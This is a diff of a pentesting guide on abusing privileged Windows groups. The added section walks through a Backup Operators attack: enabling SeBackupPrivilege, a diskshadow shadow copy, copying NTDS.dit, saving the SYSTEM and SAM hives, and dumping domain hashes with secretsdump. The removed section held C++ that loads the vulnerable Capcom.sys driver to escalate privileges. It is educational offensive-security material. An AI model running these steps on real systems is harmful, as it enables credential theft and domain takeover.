@@ -1,4 +1,4 @@
-# Privileged Accounts and Token Privileges
+# Privileged Groups and Token Privileges
 
 <details>
 
@@ -85,9 +85,82 @@ The story changes:
 
 ## Backup Operators <a href="#backup-operators" id="backup-operators"></a>
 
-As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:
+As with `Server Operators` membership, we can **access the `DC01` file system** if we belong to `Backup Operators`.
+
+This is because this group grants its **members** the [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) privileges. The **SeBackupPrivilege** allows us to **traverse any folder and list** the folder contents. This will let us **copy a file from a folder,** even if nothing else is giving you permissions. However, to abuse this permissions to copy a file the flag [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) **** must be used. Therefore, special tools are needed.
+
+For this purpose you can use [**these scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**
+
+### **Local Attack**
+
+```bash
+# Import libraries
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled
+
+# Enable SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+
+# List Admin folder for example and steal a file
+dir C:\Users\Administrator\
+Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
+```
+
+### AD Attack
+
+For instance, you can directly access the Domain Controller file system:
 
 ![](../../.gitbook/assets/a7.png)
+
+You can abuse this access to **steal** the active directory database **`NTDS.dit`** to get all the **NTLM hashes** for all user and computer objects in the domain.
+
+Using [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)  you can **create a shadow copy** of the **`C` drive** and in the `F` drive for example. The, you can steal the `NTDS.dit` file from this shadow copy as it won't be in use by the system:
+
+```
+diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 10:34:16 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% F:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+
+As in the local attack, you can now copy the privileged file **`NTDS.dit`**:
+
+```
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
+Another way to copy files is using [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
+
+```
+robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+```
+
+Then, you can easily **steal** the **SYSTEM** and **SAM**:
+
+```
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+Finally you can **get all the hashes** from the **`NTDS.dit`**:
+
+```shell-session
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
 
 ## DnsAdmins
 
@@ -154,207 +227,6 @@ gMSA accounts have their passwords stored in a LDAP property called _**msDS-Mana
 So, if gMSA is being used, find if it has **special privileges** and also check if you have **permissions** to **read** the password of the services.
 
 Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
-
-## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>
-
-A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:
-
-![](../../.gitbook/assets/a8.png)
-
-`Whoami /priv` shows the privilege is disabled by default:
-
-![](../../.gitbook/assets/a9.png)
-
-However, the below code allows enabling that privilege fairly easily:
-
-{% code title="privileges.cpp" %}
-```c
-#include "stdafx.h"
-#include <windows.h>
-#include <stdio.h>
-
-int main()
-{
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-	bool bEnablePrivilege(true);
-	HANDLE hToken(NULL);
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-
-	if (!LookupPrivilegeValue(
-		NULL,            // lookup privilege on local system
-		L"SeLoadDriverPrivilege",   // privilege to lookup 
-		&luid))        // receives LUID of privilege
-	{
-		printf("LookupPrivilegeValue error: %un", GetLastError());
-		return FALSE;
-	}
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	
-	if (bEnablePrivilege) {
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	}
-	
-	// Enable the privilege or disable all privileges.
-	if (!AdjustTokenPrivileges(
-		hToken,
-		FALSE,
-		&tp,
-		sizeof(TOKEN_PRIVILEGES),
-		(PTOKEN_PRIVILEGES)NULL,
-		(PDWORD)NULL))
-	{
-		printf("AdjustTokenPrivileges error: %x", GetLastError());
-		return FALSE;
-	}
-
-	system("cmd");
-    return 0;
-}
-```
-{% endcode %}
-
-We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:
-
-![](../../.gitbook/assets/a10.png)
-
-### Capcom.sys Driver Exploit <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>
-
-To further prove the `SeLoadDriverPrivilege` is dangerous, let's **exploit it to elevate privileges**.
-
-You can load a new driver using **NTLoadDriver:**
-
-```cpp
-NTSTATUS NTLoadDriver(
-  _In_ PUNICODE_STRING DriverServiceName
-);
-```
-
-By default the driver service name should be under `\Registry\Machine\System\CurrentControlSet\Services\`
-
-But, according with to the **documentation** you **could** also **use** paths under **HKEY\_CURRENT\_USER**, so you could **modify** a **registry** there to **load arbitrary drivers** on the system.\
-The relevant parameters that must be defined in the new registry are:
-
-* **ImagePath:** REG\_EXPAND\_SZ type value which specifies the driver path. In this context, the path should be a directory with modification permissions by the non-privileged user.
-* **Type**: Value of type REG\_WORD in which the type of the service is indicated. For our purpose, the value should be defined as SERVICE\_KERNEL\_DRIVER (0x00000001).
-
-Therefore you could create a new registry in **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicating in **ImagePath** the path to the driver and in **Type** the with value 1 and use those values on the exploit (you can obtain the User SID using: `Get-ADUser -Identity 'USERNAME' | select SID` or `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`
-
-```bash
-PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
-PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
-```
-
-The first one declares a string variable indicating where the vulnerable **Capcom.sys** driver is located on the victim system and the second one is a string variable indicating a service name that will be used (could be any service).\
-Note, that the **driver must be signed by Windows** so you cannot load arbitrary drivers. But, **Capcom.sys** **can be abused to execute arbitrary code and is signed by Windows**, so the goal is to load this driver and exploit it.
-
-Load the driver:
-
-```c
-#include "stdafx.h"
-#include <windows.h>
-#include <stdio.h>
-#include <ntsecapi.h>
-#include <stdlib.h>
-#include <locale.h>
-#include <iostream>
-#include "stdafx.h"
-
-NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
-VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
-NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);
-
-int main()
-{
-	TOKEN_PRIVILEGES tp;
-	LUID luid;
-	bool bEnablePrivilege(true);
-	HANDLE hToken(NULL);
-	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
-
-	if (!LookupPrivilegeValue(
-		NULL,            // lookup privilege on local system
-		L"SeLoadDriverPrivilege",   // privilege to lookup 
-		&luid))        // receives LUID of privilege
-	{
-		printf("LookupPrivilegeValue error: %un", GetLastError());
-		return FALSE;
-	}
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	
-	if (bEnablePrivilege) {
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	}
-	
-	// Enable the privilege or disable all privileges.
-	if (!AdjustTokenPrivileges(
-		hToken,
-		FALSE,
-		&tp,
-		sizeof(TOKEN_PRIVILEGES),
-		(PTOKEN_PRIVILEGES)NULL,
-		(PDWORD)NULL))
-	{
-		printf("AdjustTokenPrivileges error: %x", GetLastError());
-		return FALSE;
-	}
-
-	//system("cmd");
-	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
-	std::cout << "[+] Set Registry Keys" << std::endl;
-	NTSTATUS st1;
-	UNICODE_STRING pPath;
-	UNICODE_STRING pPathReg;
-	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
-  PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
-	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
-	HMODULE hObsolete = GetModuleHandleA(NTDLL);
-	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
-	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
-	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");
-
-	RtlInitUnicodeString(&pPath, pPathSource);
-	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
-	st1 = NtLoadDriver(&pPathReg);
-	std::cout << "[+] value of st1: " << st1 << "\n";
-	if (st1 == ERROR_SUCCESS) {
-		std::cout << "[+] Driver Loaded as Kernel..\n";
-		std::cout << "[+] Press [ENTER] to unload driver\n";
-	}
-
-	getchar();
-	st1 = NtUnloadDriver(&pPathReg);
-	if (st1 == ERROR_SUCCESS) {
-		std::cout << "[+] Driver unloaded from Kernel..\n";
-		std::cout << "[+] Press [ENTER] to exit\n";
-		getchar();
-	}
-
-    return 0;
-}
-```
-
-Once the above code is compiled and executed, we can see that our malicious `Capcom.sys` driver gets loaded onto the victim system:
-
-![](../../.gitbook/assets/a11.png)
-
-Download: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)
-
-**No it's time to abuse the loaded driver to execute arbitrary code.**
-
-You can download exploits from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) and execute it on the system to elevate our privileges to `NT Authority\System`:
-
-![](../../.gitbook/assets/a12.png)
-
-### Auto
-
-You can use [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) to **automatically enable** the **privilege**, **create** the **registry key** under HKEY\_CURRENT\_USER and **execute NTLoadDriver** indicating the registry key that you want to create and the path to the driver:
-
-![](<../../.gitbook/assets/image (289).png>)
-
-Then, you will need to download a **Capcom.sys** exploit and use it to escalate privileges.
 
 ## References <a href="#references" id="references"></a>
 
